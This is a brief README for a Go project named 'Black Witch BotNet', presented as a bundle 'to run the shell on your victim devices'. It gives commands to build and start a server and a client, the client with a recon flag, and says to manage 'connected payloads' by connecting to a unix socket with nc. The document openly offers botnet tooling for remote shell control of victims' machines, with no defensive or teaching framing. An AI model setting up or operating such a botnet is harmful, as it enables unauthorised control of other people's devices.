# Black Witch BotNet

### The blank bundle to run the shell on your victim devices

Run the server
```
cd cmd/server && rm -rf ../../tmp/unix.sock && go build && ./server
```
Run the client
```
cd cmd/client && go build && ./client -recon 1
```

To manage connected payloads you may use nc or something that can connect to the unix sock
```
nc -U tmp/unix.sock
```
